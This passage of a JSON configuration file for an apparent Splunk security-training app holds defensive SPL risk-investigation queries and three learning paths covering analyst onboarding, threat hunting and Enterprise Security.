            "spl": "index=risk risk_object=\"dlee\" earliest=-7d | stats sum(risk_score) as total_risk, dc(source) as detection_count, values(source) as detections, min(_time) as first_activity, max(_time) as last_activity | eval first_activity=strftime(first_activity, \"%Y-%m-%d %H:%M\"), last_activity=strftime(last_activity, \"%Y-%m-%d %H:%M\") | eval activity_window=first_activity.\" to \".last_activity",
            "explanation": "This single query provides the investigation summary:\n total_risk: Cumulative risk score\n detection_count: Number of different rules that triggered\n detections: List of all contributing detection names\n activity_window: When the suspicious activity occurred\n\nThis is your starting point for any RBA investigation - the \"executive summary\" before you dig into details."
          },
          "variations": [
            {
              "description": "Break down by day to see if activity is ongoing:",
              "spl": "index=risk risk_object=\"dlee\" earliest=-7d | eval day=strftime(_time, \"%Y-%m-%d\") | stats sum(risk_score) as daily_risk, dc(source) as detections by day | sort day"
            },
            {
              "description": "Show the risk contribution from each detection:",
              "spl": "index=risk risk_object=\"dlee\" earliest=-7d | stats sum(risk_score) as risk_contribution, count as events, latest(risk_message) as sample_message by source | sort -risk_contribution"
            },
            {
              "description": "Compare this user's risk to their peers (same department):",
              "spl": "index=risk earliest=-7d | lookup identity_lookup_expanded identity as risk_object OUTPUT bunit | where bunit=\"Finance\" | stats sum(risk_score) as total_risk by risk_object | sort -total_risk | head 20"
            }
          ]
        }
      }
    ]
  },
  "pipelines": [
    {
      "id": "pipeline-new-analyst",
      "title": "New Analyst Onboarding",
      "description": "A comprehensive learning path for analysts new to Splunk and security operations. Build foundational skills from search basics to your first investigation.",
      "level": "beginner",
      "duration": "4-6 hours",
      "icon": "",
      "objectives": [
        "Understand SPL fundamentals and search anatomy",
        "Master filtering, field extraction, and data manipulation",
        "Learn to aggregate and visualize security data",
        "Complete your first simulated investigation"
      ],
      "steps": [
        {
          "id": "step-1",
          "title": "Finding Your Data",
          "type": "guide",
          "source": "guides",
          "sourceId": "search-index-sourcetype",
          "description": "Learn how to search the right data using index and sourcetype.",
          "duration": "15 min"
        },
        {
          "id": "step-2",
          "title": "Anatomy of a Search",
          "type": "tutorial",
          "source": "training",
          "sourceId": "found-001",
          "description": "Deep dive into how SPL searches flow through the pipeline.",
          "duration": "15 min"
        },
        {
          "id": "step-3",
          "title": "Filtering Your Results",
          "type": "guide",
          "source": "guides",
          "sourceId": "filter-results",
          "description": "Learn to use where, search, and other filtering commands.",
          "duration": "10 min"
        },
        {
          "id": "step-4",
          "title": "Working with Fields",
          "type": "guide",
          "source": "guides",
          "sourceId": "choose-fields",
          "description": "Learn to select and display only the fields you need.",
          "duration": "20 min"
        },
        {
          "id": "step-5",
          "title": "The Stats Command",
          "type": "tutorial",
          "source": "training",
          "sourceId": "found-002",
          "description": "Master the most important aggregation command in SPL.",
          "duration": "20 min"
        },
        {
          "id": "step-6",
          "title": "Counting and Summarizing",
          "type": "guide",
          "source": "guides",
          "sourceId": "count-events",
          "description": "Learn different ways to count and summarize your security events.",
          "duration": "15 min"
        },
        {
          "id": "step-7",
          "title": "Time-Based Analysis",
          "type": "guide",
          "source": "guides",
          "sourceId": "count-over-time",
          "description": "Visualize trends over time with timechart and related commands.",
          "duration": "15 min"
        },
        {
          "id": "step-8",
          "title": "SPL Reference Review",
          "type": "reference",
          "source": "glossary",
          "sourceId": null,
          "description": "Explore the SPL command reference to reinforce your learning.",
          "duration": "20 min",
          "link": "/glossary"
        },
        {
          "id": "step-9",
          "title": "Query Library Exploration",
          "type": "reference",
          "source": "queries",
          "sourceId": null,
          "description": "Browse real-world security queries for inspiration.",
          "duration": "15 min",
          "link": "/query-library"
        },
        {
          "id": "step-10",
          "title": "Your First Investigation",
          "type": "scenario",
          "source": "training",
          "sourceId": "scenario-001",
          "description": "Apply everything you learned in a simulated security investigation.",
          "duration": "30 min"
        }
      ]
    },
    {
      "id": "pipeline-threat-hunting",
      "title": "Threat Hunting Fundamentals",
      "description": "Move from reactive alerting to proactive threat detection. Learn hypothesis-driven hunting methodology and apply it to real attack patterns.",
      "level": "intermediate",
      "duration": "3-4 hours",
      "icon": "",
      "objectives": [
        "Understand hypothesis-driven threat hunting methodology",
        "Establish behavioral baselines for anomaly detection",
        "Hunt for lateral movement, persistence, and evasion techniques",
        "Build reusable hunt queries from threat intelligence"
      ],
      "steps": [
        {
          "id": "step-1",
          "title": "Hunting Methodology",
          "type": "tutorial",
          "source": "training",
          "sourceId": "int-010",
          "description": "Learn the hypothesis-driven approach to proactive threat hunting.",
          "duration": "25 min"
        },
        {
          "id": "step-2",
          "title": "Baselining Normal Behavior",
          "type": "guide",
          "source": "guides",
          "sourceId": "baseline-behavior",
          "description": "Establish what 'normal' looks like so you can spot anomalies.",
          "duration": "15 min"
        },
        {
          "id": "step-3",
          "title": "Statistical Baselines in SPL",
          "type": "tutorial",
          "source": "training",
          "sourceId": "adv-001",
          "description": "Build dynamic statistical baselines with eventstats and streamstats.",
          "duration": "30 min"
        },
        {
          "id": "step-4",
          "title": "Finding Brute Force Attacks",
          "type": "guide",
          "source": "guides",
          "sourceId": "find-brute-force",
          "description": "Detect password guessing and credential stuffing attacks.",
          "duration": "15 min"
        },
        {
          "id": "step-5",
          "title": "Hunt: Lateral Movement",
          "type": "scenario",
          "source": "training",
          "sourceId": "int-002",
          "description": "Track an attacker moving through your network after initial compromise.",
          "duration": "25 min"
        },
        {
          "id": "step-6",
          "title": "Detecting Impossible Travel",
          "type": "guide",
          "source": "guides",
          "sourceId": "find-impossible-travel",
          "description": "Find geographically impossible authentication patterns.",
          "duration": "15 min"
        },
        {
          "id": "step-7",
          "title": "Hunt: Impossible Travel Scenario",
          "type": "scenario",
          "source": "training",
          "sourceId": "int-008",
          "description": "Investigate a user appearing in multiple countries simultaneously.",
          "duration": "20 min"
        },
        {
          "id": "step-8",
          "title": "Hunt: Beaconing Detection",
          "type": "scenario",
          "source": "training",
          "sourceId": "adv-002",
          "description": "Find command-and-control traffic hiding in regular intervals.",
          "duration": "30 min"
        },
        {
          "id": "step-9",
          "title": "Hunt: Persistence Mechanisms",
          "type": "scenario",
          "source": "training",
          "sourceId": "adv-003",
          "description": "Discover how attackers maintain access after system reboots.",
          "duration": "25 min"
        },
        {
          "id": "step-10",
          "title": "Developing Hunt Hypotheses",
          "type": "challenge",
          "source": "training",
          "sourceId": "int-011",
          "description": "Practice converting threat intel into testable hunt queries.",
          "duration": "20 min"
        }
      ]
    },
    {
      "id": "pipeline-enterprise-security",
      "title": "Enterprise Security Mastery",
      "description": "Master Splunk Enterprise Security for SOC operations. Learn to leverage data models, risk-based alerting, and correlation searches for efficient threat detection.",
      "level": "advanced",
      "duration": "5-6 hours",
      "icon": "",
      "objectives": [
        "Navigate ES efficiently using data models and tstats",
        "Implement risk-based alerting to reduce alert fatigue",
        "Investigate notable events using the ES workflow",
        "Build custom correlation searches and detection rules"
      ],
      "steps": [
        {
          "id": "step-1",
          "title": "ES for Splunk Users",
          "type": "tutorial",
          "source": "training",
          "sourceId": "es-001",
          "description": "Understand how ES changes your Splunk workflow and why.",
          "duration": "15 min"
        },
        {
          "id": "step-2",
          "title": "Understanding Data Models",
          "type": "guide",
          "source": "guides",
          "sourceId": "es-data-models-intro",
          "description": "Learn how CIM data models organize and accelerate your data.",
          "duration": "15 min"
        },
        {
          "id": "step-3",
          "title": "tstats vs stats",
          "type": "tutorial",
          "source": "training",
          "sourceId": "es-006",
          "description": "Master the query paradigm shift that makes ES searches fast.",
          "duration": "20 min"
        },
        {
          "id": "step-4",
          "title": "Using tstats with Data Models",
          "type": "guide",
          "source": "guides",
          "sourceId": "es-tstats-datamodels",
          "description": "Write efficient aggregate queries using ES accelerated data.",
          "duration": "15 min"
        },
        {
          "id": "step-5",
          "title": "Notable Events Explained",
          "type": "tutorial",
          "source": "training",
          "sourceId": "es-002",
          "description": "Understand your new alert queue and how it differs from traditional alerts.",
          "duration": "15 min"
        },
        {
          "id": "step-6",
          "title": "Your First Notable Investigation",
          "type": "scenario",
          "source": "training",
          "sourceId": "es-004",
          "description": "Walk through the complete investigation workflow for a notable event.",
          "duration": "25 min"
        },
        {
          "id": "step-7",
          "title": "Risk-Based Alerting Philosophy",
          "type": "tutorial",
          "source": "training",
          "sourceId": "es-003",
          "description": "Learn why RBA reduces alert fatigue and how it works.",
          "duration": "20 min"
        },
        {
          "id": "step-8",
          "title": "RBA Fundamentals Guide",
          "type": "guide",
          "source": "guides",
          "sourceId": "es-risk-based-alerting",
          "description": "Deep dive into risk scoring, attribution, and thresholds.",
          "duration": "15 min"
        },
        {
          "id": "step-9",
          "title": "Investigating High-Risk Users",
          "type": "scenario",
          "source": "training",
          "sourceId": "es-005",
          "description": "Analyze a user with elevated risk score and trace contributing events.",
          "duration": "25 min"
        },
        {
          "id": "step-10",
          "title": "Asset and Identity Enrichment",
          "type": "tutorial",
          "source": "training",
          "sourceId": "es-007",
          "description": "Add business context to your events using ES lookups.",
          "duration": "15 min"
        },
        {
          "id": "step-11",
          "title": "Standard to tstats Translation",
          "type": "challenge",
          "source": "training",
          "sourceId": "es-008",
          "description": "Practice converting traditional SPL queries to efficient ES format.",
          "duration": "20 min"
        },
        {
          "id": "step-12",
          "title": "Creating Correlation Searches",
          "type": "guide",
          "source": "guides",
          "sourceId": "es-correlation-searches",
          "description": "Build your own detection rules that generate notables and risk.",
          "duration": "20 min"
        },
        {
          "id": "step-13",
          "title": "Notable Triage Challenge",
          "type": "challenge",
          "source": "training",
          "sourceId": "es-009",
          "description": "Test your skills triaging and prioritizing a queue of notables.",
          "duration": "20 min"
        },
        {
          "id": "step-14",
          "title": "Risk Investigation Query",
          "type": "challenge",
          "source": "training",
          "sourceId": "es-010",
          "description": "Build a comprehensive risk investigation query from scratch.",
          "duration": "25 min"
        }
      ]
    }
  ]
}
